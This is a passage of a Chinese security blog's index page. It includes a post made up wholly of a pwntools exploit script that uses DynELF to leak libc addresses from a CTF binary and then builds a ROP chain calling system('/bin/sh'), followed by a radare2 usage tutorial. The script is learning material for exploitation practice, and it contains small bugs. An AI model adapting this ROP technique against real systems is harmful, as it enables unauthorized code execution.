+<p>[1] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XYZWlIZQLgA86tJPiOpM6A">记一次偶遇Adminer </a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/13/note/web/scripts/">
+    <time datetime="2020-11-13T01:24:51.000Z" class="entry-date">
+        2020-11-13
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/pwn/dynelf" class="post-note/pwn/dynelf post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/10/note/pwn/dynelf/">使用dynelf泄露地址</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/10/note/pwn/dynelf/" data-id="ckhe8gmwi0000d0wbcpmqfa3p" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload =<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+p16(<span class="number">0xE7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">func_addr = <span class="number">0x80487d0</span></span><br><span class="line">write_addr = <span class="number">0x8048578</span></span><br><span class="line">pppr_addr = <span class="number">0x080488f9</span></span><br><span class="line">write_symbol = <span class="number">0x8049FEC</span></span><br><span class="line">// 需要可持续性的泄露</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(write_addr)+p32(pppr_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)+p32(func_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0xE7</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recv()[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">d = DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">sys_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = d.lookup(<span class="string">&#x27;str_bin_sh&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;sys_addr: 0x%08x,binsh: 0x%08x&quot;</span>,sys_addr,p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/10/note/pwn/dynelf/">
+    <time datetime="2020-11-10T02:42:54.000Z" class="entry-date">
+        2020-11-10
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/rev/radare2" class="post-note/rev/radare2 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/09/note/rev/radare2/">radare2使用</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/09/note/rev/radare2/" data-id="ckhe8gmwl0001d0wbbfbk2q97" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>radare2 nb!!!</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://github.com/radareorg/radare2">radare2</a>是类unix逆向框架和命令行工具箱</p>
+<p><a target="_blank" rel="noopener" href="https://book.rada.re/">官方book</a></p>
+<ul>
+<li>rax2 数值转换</li>
+<li>rasm2 汇编和反汇编</li>
+<li>rabin2 查看文件格式</li>
+<li>radiff2 对文件进行diff</li>
+<li>ragg2/ragg2cc 方便生成shellcode</li>
+<li>rahash2 各种密码hash算法</li>
+<li>radare2 整合上面工具</li>
+</ul>
+<p>此外还有radare2其它的套件</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax2 -h</span><br></pre></td></tr></table></figure>
+<p>里面说的很明白了</p>
+<h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -L | grep head <span class="comment"># 列出前几项支持的架构</span></span><br><span class="line">rasm2 -a arm <span class="string">&quot;nop;nop;nop&quot;</span> <span class="comment"># -a用于指出架构类型</span></span><br><span class="line"><span class="comment"># 0000a0e10000a0e10000a0e1</span></span><br><span class="line">rasm2 -a arm -d <span class="string">&quot;0000a0e10000a0e10000a0e1&quot;</span> <span class="comment"># -d用于指出反汇编操作</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line">rasm2 -a arm -b 64 <span class="string">&quot;nop;nop;nop&quot;</span> <span class="comment"># -b用于指出位数</span></span><br><span class="line"><span class="comment"># 1f2003d51f2003d51f2003d5</span></span><br><span class="line">rasm2 -a arm -b 64 -d <span class="string">&quot;1f2003d51f2003d51f2003d5&quot;</span> -r <span class="comment"># -r表示在radare2中实现对应功能的命令</span></span><br></pre></td></tr></table></figure>
+<h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rabin2 -I a.out <span class="comment"># 显示文件信息</span></span><br><span class="line">rabin2 -zz a.out <span class="comment"># 显示文件中的字符串，包含utf-8等宽字符串</span></span><br><span class="line">rabin2 -O? <span class="comment"># 显示-O选项的帮助，-O用于更改文件属性</span></span><br><span class="line">rabin2 -S a.out | grep text <span class="comment"># -S用于显示文件属性</span></span><br><span class="line">rabin2 -O p/.text/r a.out <span class="comment"># 修改text段为只读</span></span><br><span class="line">rabin2 -S a.out | grep text</span><br></pre></td></tr></table></figure>
+<h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radiff2 -h</span><br></pre></td></tr></table></figure>
+<h3 id="ragg2-ragg2cc"><a href="#ragg2-ragg2cc" class="headerlink" title="ragg2/ragg2cc"></a>ragg2/ragg2cc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hi\n&quot;</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ragg2 -ax86 -b32 1.c</span><br></pre></td></tr></table></figure>
+<p>还可以编译.r文件(ragg2语言)</p>
+<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rahash2 -h </span><br><span class="line">rahash2 -a md5 -s admin</span><br></pre></td></tr></table></figure>
+<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r2 bin <span class="comment"># 进入程序，-d进入debug模式</span></span><br><span class="line">radare2 bin</span><br></pre></td></tr></table></figure>
+<p>指令格式<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[.][<span class="built_in">times</span>][cmd][~grep][@[@iter]addr!size][|&gt;pipe] ;</span><br></pre></td></tr></table></figure><br>显示某一个指令的帮助<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令?</span><br></pre></td></tr></table></figure><br>从当前位置打印十六进制<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">px</span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">px @ main <span class="comment"># 表示从main开始执行px，main也可以是地址</span></span><br></pre></td></tr></table></figure><br>a进行分析，aaa进行完整分析，aaaa添加实验性特性<br>pdf打印函数代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdf @ main <span class="comment"># 打印main函数的代码，main也可以是某个地址</span></span><br></pre></td></tr></table></figure><br>radare2没识别的函数可以用af来识别<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af @ addr </span><br></pre></td></tr></table></figure><br>s用于跳转到指定位置</p>
+<p>pd用于打印汇编信息</p>
+<p>pdc可以用于查看反编译代码</p>
+<h3 id="VV进入图形化模式"><a href="#VV进入图形化模式" class="headerlink" title="VV进入图形化模式"></a>VV进入图形化模式</h3><p>?用于显示帮助信息</p>
+<p>可以发现键位是类似于vim的</p>
+<p>p/P切换图形模式的显示模式</p>
+<p>:输入命令，hjkl移动图形</p>
+<p>!在调试时很有用，显示了各种信息</p>
+<p>空格切换图形/文本模式</p>
+<p>文本模式下可以用p来切换视图</p>
+<h4 id="r2patch程序"><a href="#r2patch程序" class="headerlink" title="r2patch程序"></a>r2patch程序</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -w bin <span class="comment"># 以可写模式载入bin文件，或者r2内使用e io.cache=true</span></span><br></pre></td></tr></table></figure>
+<p>w系列用于patch文件</p>
+<ul>
+<li>wa可以用于使用汇编指令patch文件，wa?查看帮助</li>
+<li>wx用于十六进制patch</li>
+</ul>
+<p>可视化patch<br>Vp,然后输入A就可以patch了</p>
+<p>输入/ 用于搜索</p>
+<p>ax用于管理交叉引用，/r 用于搜索</p>
+<p>文档说$可以反编译，我没有= =</p>
+<blockquote>
+<p>另外可以使用esil语言模拟执行</p>
+</blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1514/">Radare2使用全解</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/09/note/rev/radare2/">
+    <time datetime="2020-11-09T15:33:31.000Z" class="entry-date">
+        2020-11-09
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+  
+    <nav id="pagination">
+      <nav id="page-nav">
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      </nav>
+    </nav>
+  
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/27/note/papers/1-1/">app行为的语义提取方案读论文笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/note/rev/qiling/">麒麟框架使用--官方示例</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/24/note/web/pentist-1/">靶机看答案渗透记录-1</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/20/writeup/kctf2020-10/wp/">kctf2020部分wp</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/20/note/web/DiD/">网络安全中的纵深防御概念</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2020 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
